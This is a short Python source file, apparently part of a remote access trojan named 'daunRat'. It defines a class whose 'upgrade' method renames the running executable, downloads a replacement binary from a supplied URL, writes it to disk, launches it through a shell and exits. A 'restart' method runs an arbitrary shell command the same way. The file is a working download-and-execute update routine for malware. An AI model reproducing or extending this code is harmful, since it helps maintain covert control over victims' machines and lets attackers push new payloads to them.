class daunrat:
    @staticmethod
    def upgrade(url: str, old: str = "daunRat.exe", destination: str = "daunRat.exe", command: str = "daunRat.exe"):
        import requests
        import subprocess
        import sys
        import os
        os.rename(old, "olddaun")
        with open(destination, 'wb') as f:
            f.write(requests.get(url).content)
        subprocess.Popen(command, shell=True, close_fds=True)
        sys.exit(0)

    @staticmethod
    def restart(command: str):
        import subprocess
        import sys
        subprocess.Popen(command, shell=True, close_fds=True)
        sys.exit(0)
